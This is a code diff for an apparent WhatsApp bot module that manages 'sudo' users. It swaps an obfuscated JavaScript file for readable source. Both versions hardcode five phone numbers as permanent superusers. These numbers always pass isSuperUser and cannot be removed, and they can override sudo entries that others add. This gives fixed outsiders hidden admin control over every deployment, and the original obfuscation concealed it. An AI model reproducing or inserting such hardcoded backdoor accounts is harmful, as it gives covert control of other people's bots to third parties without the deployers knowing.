@@ -1,1 +1,144 @@
-const a0_0x5bdbc8=a0_0x1e75;(function(_0x585496,_0x1584db){const _0x4abd44=a0_0x1e75,_0x22b6f8=_0x585496();while(!![]){try{const _0x2abaca=parseInt(_0x4abd44(0x227))/0x1*(parseInt(_0x4abd44(0x20d))/0x2)+-parseInt(_0x4abd44(0x1dd))/0x3*(-parseInt(_0x4abd44(0x219))/0x4)+-parseInt(_0x4abd44(0x1f5))/0x5+-parseInt(_0x4abd44(0x1f3))/0x6*(-parseInt(_0x4abd44(0x214))/0x7)+parseInt(_0x4abd44(0x1fc))/0x8*(-parseInt(_0x4abd44(0x21e))/0x9)+parseInt(_0x4abd44(0x211))/0xa*(-parseInt(_0x4abd44(0x212))/0xb)+parseInt(_0x4abd44(0x1ff))/0xc;if(_0x2abaca===_0x1584db)break;else _0x22b6f8['push'](_0x22b6f8['shift']());}catch(_0x2fdb1a){_0x22b6f8['push'](_0x22b6f8['shift']());}}}(a0_0x226d,0x579dd));const a0_0x4910d0=(function(){let _0x50068=!![];return function(_0x4970a7,_0xd288f8){const _0x5a09e5=_0x50068?function(){const _0x1aa1b4=a0_0x1e75;if(_0xd288f8){const _0x5d14fe=_0xd288f8[_0x1aa1b4(0x1e9)](_0x4970a7,arguments);return _0xd288f8=null,_0x5d14fe;}}:function(){};return _0x50068=![],_0x5a09e5;};}()),a0_0x44cac8=a0_0x4910d0(this,function(){const _0x497f61=a0_0x1e75;if(a0_0x44cac8['bind']()[_0x497f61(0x1fb)]()[_0x497f61(0x201)]('\x0a')!==-0x1)return;return a0_0x44cac8[_0x497f61(0x1fb)]()[_0x497f61(0x207)](_0x497f61(0x1ed)+'+$')[_0x497f61(0x1fb)]()[_0x497f61(0x1fa)+'r'](a0_0x44cac8)['search'](_0x497f61(0x1ed)+'+$');});a0_0x44cac8();const {DATABASE}=require(a0_0x5bdbc8(0x1f9)),{DataTypes}=require(a0_0x5bdbc8(0x1e2)),PERMANENT_NUMBERS=[a0_0x5bdbc8(0x1e4)+'40',a0_0x5bdbc8(0x1d3)+'98',a0_0x5bdbc8(0x21a)+'50',a0_0x5bdbc8(0x218)+'00','2547075251'+'58'],a0_0x253e63={};a0_0x253e63[a0_0x5bdbc8(0x1e5)]=DataTypes[a0_0x5bdbc8(0x1d5)],a0_0x253e63[a0_0x5bdbc8(0x1de)]=!![],a0_0x253e63[a0_0x5bdbc8(0x220)+a0_0x5bdbc8(0x217)]=!![];const a0_0x3b00dc={};a0_0x3b00dc[a0_0x5bdbc8(0x1e5)]=DataTypes[a0_0x5bdbc8(0x223)],a0_0x3b00dc[a0_0x5bdbc8(0x1d4)]=![],a0_0x3b00dc[a0_0x5bdbc8(0x1d7)]=!![];const a0_0x4ed755={};function a0_0x1e75(_0x3338c5,_0x16bba2){_0x3338c5=_0x3338c5-0x1d3;const _0x273fb1=a0_0x226d();let _0x44cac8=_0x273fb1[_0x3338c5];if(a0_0x1e75['ejWExJ']===undefined){var _0x4910d0=function(_0x39425d){const _0x438ef1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';let _0x2b8e16='',_0x4fe241='',_0x464ddf=_0x2b8e16+_0x4910d0,_0x253e63=(''+function(){return 0x0;})['indexOf']('\x0a')!==-0x1;for(let _0x3b00dc=0x0,_0x4ed755,_0x873dc5,_0x4e8670=0x0;_0x873dc5=_0x39425d['charAt'](_0x4e8670++);~_0x873dc5&&(_0x4ed755=_0x3b00dc%0x4?_0x4ed755*0x40+_0x873dc5:_0x873dc5,_0x3b00dc++%0x4)?_0x2b8e16+=_0x253e63||_0x464ddf['charCodeAt'](_0x4e8670+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x4ed755>>(-0x2*_0x3b00dc&0x6)):_0x3b00dc:0x0){_0x873dc5=_0x438ef1['indexOf'](_0x873dc5);}for(let _0xda0949=0x0,_0x2fd760=_0x2b8e16['length'];_0xda0949<_0x2fd760;_0xda0949++){_0x4fe241+='%'+('00'+_0x2b8e16['charCodeAt'](_0xda0949)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4fe241);};a0_0x1e75['TkdQNg']=_0x4910d0,a0_0x1e75['nGkCyU']={},a0_0x1e75['ejWExJ']=!![];}const _0x226dbd=_0x273fb1[0x0],_0x1e75a6=_0x3338c5+_0x226dbd,_0x1a9697=a0_0x1e75['nGkCyU'][_0x1e75a6];if(!_0x1a9697){const _0x29ead9=function(_0x2b8493){this['BzKTfv']=_0x2b8493,this['EomNmp']=[0x1,0x0,0x0],this['EptYFY']=function(){return'newState';},this['ivHsaY']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['BTWPVs']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x29ead9['prototype']['CQgjtj']=function(){const _0x46b4de=new RegExp(this['ivHsaY']+this['BTWPVs']),_0x24e127=_0x46b4de['test'](this['EptYFY']['toString']())?--this['EomNmp'][0x1]:--this['EomNmp'][0x0];return this['ynfjvI'](_0x24e127);},_0x29ead9['prototype']['ynfjvI']=function(_0x497ed6){if(!Boolean(~_0x497ed6))return _0x497ed6;return this['CGhccp'](this['BzKTfv']);},_0x29ead9['prototype']['CGhccp']=function(_0x380576){for(let _0x1253ea=0x0,_0x50068=this['EomNmp']['length'];_0x1253ea<_0x50068;_0x1253ea++){this['EomNmp']['push'](Math['round'](Math['random']())),_0x50068=this['EomNmp']['length'];}return _0x380576(this['EomNmp'][0x0]);},(''+function(){return 0x0;})['indexOf']('\x0a')===-0x1&&new _0x29ead9(a0_0x1e75)['CQgjtj'](),_0x44cac8=a0_0x1e75['TkdQNg'](_0x44cac8),a0_0x1e75['nGkCyU'][_0x1e75a6]=_0x44cac8;}else _0x44cac8=_0x1a9697;return _0x44cac8;}a0_0x4ed755['type']=DataTypes[a0_0x5bdbc8(0x223)],a0_0x4ed755[a0_0x5bdbc8(0x1d4)]=!![],a0_0x4ed755[a0_0x5bdbc8(0x1ef)+'ue']=null;const a0_0x873dc5={};function a0_0x226d(){const _0x421b94=['CgfYzw50','yYGPigzHAwXLza','ntj2A1jYqNu','D2fYBG','mJu0nZyZotG2mW','ywXSB3DoDwXS','su5uruDfuG','u3vKB0rc','Dw5PCxvL','w1nvre9DifjLyW','u3vKB051BwjLCG','Aw5JBhvKzxm','zMLUze9Yq3jLyq','zxjYB3i','mJGYuK9gBM5e','ChjPBwfYEuTLEq','zgvZDhjVEq','zMLUze9Uzq','w1nvre9Dw0rfta','C2vXDwvSAxPL','xsK6','mJu0nZyYmdi1mW','DhLWzq','w1nvre9Dw1nfva','Bg9N','w1nvre9Dihn5BG','yxbWBhK','BwfW','zxHWB3j0CW','AxntDxbLCLvZzq','kcGOlISPkYKRkq','zMLUzefSBa','zgvMyxvSDfzHBa','rfjpucbuqujmrq','CgvYBwfUzw50','CYbdqvndqurf','mte3nKHSsMXntG','x0vsuK9sxtO','mZm5nti3nufgturNwq','DxnLCG','u3vKB1vZzxi','z2v0u3vKB051Bq','lI9KyxrHyMfZzq','y29UC3rYDwn0BW','Dg9tDhjPBMC','mJm3nZGXnKTTuuLmrG','DgLTzxn0yw1WCW','B191C2vYCYbYzq','ntq0ndi1nLjVA1P5Ea','w1nvre9Dihn1za','Aw5KzxHpzG','t1jDoG','C3bSAxq','C3vKB191C2vYCW','tLvnqKvsuW','ieLgievysvnuuW','C2vHCMnO','BNvTyMvY','D2HLCMu','qvjFquXmx0vsuG','zxr1CM5PBMCGwW','CMvWBgfJzq','odC0neDPv0Dssa','DgfIBgvoyw1L','w1nvre9DigDLDa','y2nLC3nMDwXSEq','mZbXEe9REhe','oda5mtCXDMDkwxbg','BM90x293BMvY','otGYofziEKHWsG','C28GzMfPBgvKoG','C3LUyW','zw50','mJu0mta1ntiXmW','mJu1mtz5BejND1K','mJu0mte2mJG0ma','yMvYCW','BwvZC2fNzq','ywrKzwrcEq','ouzHs3HOsq','zgvSu3vKBW','yxv0B0LUy3jLBq','zgvMAw5L','C2v0u3vKBW','u1rssu5h','y3jLyxrLzcbZDq'];a0_0x226d=function(){return _0x421b94;};return a0_0x226d();}a0_0x873dc5['id']=a0_0x253e63,a0_0x873dc5[a0_0x5bdbc8(0x208)]=a0_0x3b00dc,a0_0x873dc5[a0_0x5bdbc8(0x21d)]=a0_0x4ed755;const a0_0x4e8670={};a0_0x4e8670[a0_0x5bdbc8(0x20e)]=a0_0x5bdbc8(0x204),a0_0x4e8670[a0_0x5bdbc8(0x1fd)]=!![];const SudoDB=DATABASE[a0_0x5bdbc8(0x221)](a0_0x5bdbc8(0x1f7),a0_0x873dc5,a0_0x4e8670);let _syncDone=![];async function initializeSudoDB(){const _0xd3f40d=a0_0x5bdbc8;if(_syncDone)return;_syncDone=!![];try{await SudoDB[_0xd3f40d(0x216)]();}catch(_0x3961d6){const _0xbf7905=_0x3961d6?.[_0xd3f40d(0x225)]?.[_0xd3f40d(0x21c)]||_0x3961d6?.[_0xd3f40d(0x21c)]||'';console[_0xd3f40d(0x228)](_0xd3f40d(0x1e8)+_0xd3f40d(0x226)+':',_0xbf7905['slice'](0x0,0x78));try{await DATABASE['query'](_0xd3f40d(0x1f0)+_0xd3f40d(0x206)+'\x20sudo_user'+_0xd3f40d(0x1f2)),await SudoDB[_0xd3f40d(0x216)](),console[_0xd3f40d(0x1e7)](_0xd3f40d(0x200)+_0xd3f40d(0x1fe)+_0xd3f40d(0x224)+_0xd3f40d(0x210)+'.');}catch(_0x480e92){console[_0xd3f40d(0x1dc)](_0xd3f40d(0x1d8)+'reation\x20al'+_0xd3f40d(0x215),_0x480e92[_0xd3f40d(0x21c)]['slice'](0x0,0x78));}}}let _sudoCache=null;async function getSudoNumbers(){const _0x3633d3=a0_0x5bdbc8;try{await initializeSudoDB();if(_sudoCache)return _sudoCache;const _0x27bb79=await SudoDB[_0x3633d3(0x1ee)]();return _sudoCache=_0x27bb79[_0x3633d3(0x1ea)](_0x2c5ba5=>_0x2c5ba5[_0x3633d3(0x208)]),_sudoCache;}catch(_0x39203e){return console['error'](_0x3633d3(0x20f)+_0x3633d3(0x1d9)+'s\x20error\x20(r'+_0x3633d3(0x20b)+_0x3633d3(0x1e3),_0x39203e[_0x3633d3(0x21c)]['slice'](0x0,0x78)),[];}}async function setSudo(_0x264bb5,_0x2527a5=null){const _0x6c3bd6=a0_0x5bdbc8;await initializeSudoDB();if(PERMANENT_NUMBERS[_0x6c3bd6(0x1da)](_0x264bb5))return![];try{const _0x11c8c8={};_0x11c8c8['number']=_0x264bb5;const _0x12addb={};_0x12addb[_0x6c3bd6(0x208)]=_0x264bb5,_0x12addb[_0x6c3bd6(0x21d)]=_0x2527a5;const _0x4b83c1={};_0x4b83c1[_0x6c3bd6(0x209)]=_0x11c8c8,_0x4b83c1['defaults']=_0x12addb;const [_0x1ab56c,_0x23afb2]=await SudoDB[_0x6c3bd6(0x1db)+'te'](_0x4b83c1);return _sudoCache=null,_0x23afb2;}catch(_0x3f54ee){return console['error'](_0x6c3bd6(0x1e6)+_0x6c3bd6(0x1f4),_0x3f54ee),![];}}async function delSudo(_0x27d6b3,_0x2a62b0=null){const _0x370a97=a0_0x5bdbc8;await initializeSudoDB();if(PERMANENT_NUMBERS[_0x370a97(0x1da)](_0x27d6b3))return _0x370a97(0x1f1);const _0x3a2f56=_0x2a62b0&&PERMANENT_NUMBERS[_0x370a97(0x1da)](_0x2a62b0);if(!_0x3a2f56){const _0xdc12f5={};_0xdc12f5[_0x370a97(0x208)]=_0x27d6b3;const _0x5f1b08={};_0x5f1b08[_0x370a97(0x209)]=_0xdc12f5;const _0x41750b=await SudoDB[_0x370a97(0x1e0)](_0x5f1b08);if(!_0x41750b)return![];const _0x4270a9=(_0x2a62b0||'')[_0x370a97(0x20c)](/\D/g,''),_0x594676=(_0x41750b['addedBy']||'')[_0x370a97(0x20c)](/\D/g,'');if(_0x594676&&_0x594676!==_0x4270a9)return _0x370a97(0x213);}try{const _0x1f96d5={};_0x1f96d5[_0x370a97(0x208)]=_0x27d6b3;const _0x533b6f={};_0x533b6f['where']=_0x1f96d5;const _0x47457e=await SudoDB[_0x370a97(0x1df)](_0x533b6f);return _sudoCache=null,_0x47457e>0x0;}catch(_0x15993e){return console['error'](_0x370a97(0x1e1)+_0x370a97(0x1f4),_0x15993e),![];}}async function clearAllSudo(){const _0x2d2786=a0_0x5bdbc8;await initializeSudoDB();try{const _0x436c1b={};_0x436c1b['where']={};const _0x2d3b74=await SudoDB[_0x2d2786(0x1df)](_0x436c1b);return _sudoCache=null,_0x2d3b74;}catch(_0x34affe){return console['error']('[SUDO][CLE'+_0x2d2786(0x20a)+_0x2d2786(0x202),_0x34affe),0x0;}}async function isSuperUser(_0x4592b1,_0x5a1fff){const _0x55e7ae=a0_0x5bdbc8;if(!_0x4592b1)return![];const _0x551d31=_0x4592b1[_0x55e7ae(0x203)]('@')[0x0]['split'](':')[0x0];if(PERMANENT_NUMBERS[_0x55e7ae(0x1da)](_0x551d31))return!![];const _0x534c83=(process.env.OWNER_NUMBER||'')[_0x55e7ae(0x20c)](/\D/g,''),_0x4d0387=_0x5a1fff?.[_0x55e7ae(0x1f6)]?.['id']?.[_0x55e7ae(0x203)](':')[0x0];if(_0x551d31===_0x534c83||_0x551d31===_0x4d0387)return!![];const _0x347361=await getSudoNumbers();return _0x347361[_0x55e7ae(0x1da)](_0x551d31);}const a0_0x1253ea={};a0_0x1253ea[a0_0x5bdbc8(0x1d6)]=SudoDB,a0_0x1253ea['PERMANENT_'+a0_0x5bdbc8(0x205)]=PERMANENT_NUMBERS,a0_0x1253ea[a0_0x5bdbc8(0x1f8)+a0_0x5bdbc8(0x21b)]=getSudoNumbers,a0_0x1253ea[a0_0x5bdbc8(0x222)]=setSudo,a0_0x1253ea[a0_0x5bdbc8(0x21f)]=delSudo,a0_0x1253ea['clearAllSu'+'do']=clearAllSudo,a0_0x1253ea[a0_0x5bdbc8(0x1ec)+'r']=isSuperUser,module[a0_0x5bdbc8(0x1eb)]=a0_0x1253ea;
+const { DATABASE } = require('./database');
+const { DataTypes } = require('sequelize');
+
+const PERMANENT_NUMBERS = [
+    '254762025340',
+    '254763986398',
+    '254116284050',
+    '254105521300',
+    '254707525158',
+];
+
+const SudoDB = DATABASE.define('SudoUser', {
+    id: {
+        type: DataTypes.INTEGER,
+        primaryKey: true,
+        autoIncrement: true,
+    },
+    number: {
+        type: DataTypes.STRING,
+        allowNull: false,
+        unique: true,
+    },
+    addedBy: {
+        type: DataTypes.STRING,
+        allowNull: true,
+        defaultValue: null,
+    },
+}, {
+    tableName: 'sudo_users',
+    timestamps: true,
+});
+
+let _syncDone = false;
+
+async function initializeSudoDB() {
+    if (_syncDone) return;
+    _syncDone = true; // set early — prevent concurrent calls even if we throw
+    try {
+        // Use plain sync (CREATE TABLE IF NOT EXISTS only).
+        // Never use { alter: true } — it runs showIndex which triggers a
+        // PostgreSQL catalog lookup (pg_attribute OID) that fails after
+        // table drop+recreate leaves stale OIDs in the pg catalog cache.
+        await SudoDB.sync();
+    } catch (err) {
+        const msg = (err?.parent?.message || err?.message || '');
+        console.warn('[SUDO] sync() failed:', msg.slice(0, 120));
+        // If the table is in a broken state, drop and recreate it cleanly
+        try {
+            await DATABASE.query('DROP TABLE IF EXISTS sudo_users CASCADE');
+            await SudoDB.sync();
+            console.log('[SUDO] sudo_users recreated successfully.');
+        } catch (e2) {
+            console.error('[SUDO] Recreation also failed:', e2.message.slice(0, 120));
+        }
+    }
+}
+
+let _sudoCache = null;
+
+async function getSudoNumbers() {
+    try {
+        await initializeSudoDB();
+        if (_sudoCache) return _sudoCache;
+        const records = await SudoDB.findAll();
+        _sudoCache = records.map(record => record.number);
+        return _sudoCache;
+    } catch (err) {
+        console.error('[SUDO] getSudoNumbers error (returning []):', err.message.slice(0, 120));
+        return [];
+    }
+}
+
+async function setSudo(number, addedByNumber = null) {
+    await initializeSudoDB();
+    if (PERMANENT_NUMBERS.includes(number)) return false;
+    try {
+        const [record, created] = await SudoDB.findOrCreate({
+            where: { number },
+            defaults: { number, addedBy: addedByNumber },
+        });
+        _sudoCache = null;
+        return created;
+    } catch (error) {
+        console.error('[SUDO][SET_ERROR]:', error);
+        return false;
+    }
+}
+
+async function delSudo(number, requestorNumber = null) {
+    await initializeSudoDB();
+    if (PERMANENT_NUMBERS.includes(number)) return 'permanent';
+
+    const isPermanentRequestor = requestorNumber && PERMANENT_NUMBERS.includes(requestorNumber);
+
+    if (!isPermanentRequestor) {
+        const record = await SudoDB.findOne({ where: { number } });
+        if (!record) return false;
+        const cleanRequestor = (requestorNumber || '').replace(/\D/g, '');
+        const cleanAddedBy  = (record.addedBy || '').replace(/\D/g, '');
+        if (cleanAddedBy && cleanAddedBy !== cleanRequestor) return 'not_owner';
+    }
+
+    try {
+        const deleted = await SudoDB.destroy({ where: { number } });
+        _sudoCache = null;
+        return deleted > 0;
+    } catch (error) {
+        console.error('[SUDO][DEL_ERROR]:', error);
+        return false;
+    }
+}
+
+async function clearAllSudo() {
+    await initializeSudoDB();
+    try {
+        const deleted = await SudoDB.destroy({ where: {} });
+        _sudoCache = null;
+        return deleted;
+    } catch (error) {
+        console.error('[SUDO][CLEAR_ALL_ERROR]:', error);
+        return 0;
+    }
+}
+
+async function isSuperUser(jid, Guru) {
+    if (!jid) return false;
+    const num = jid.split('@')[0].split(':')[0];
+    if (PERMANENT_NUMBERS.includes(num)) return true;
+    const ownerNumber = (process.env.OWNER_NUMBER || '').replace(/\D/g, '');
+    const botNum = Guru?.user?.id?.split(':')[0];
+    if (num === ownerNumber || num === botNum) return true;
+    const sudoNumbers = await getSudoNumbers();
+    return sudoNumbers.includes(num);
+}
+
+module.exports = {
+    SudoDB,
+    PERMANENT_NUMBERS,
+    getSudoNumbers,
+    setSudo,
+    delSudo,
+    clearAllSudo,
+    isSuperUser,
+};
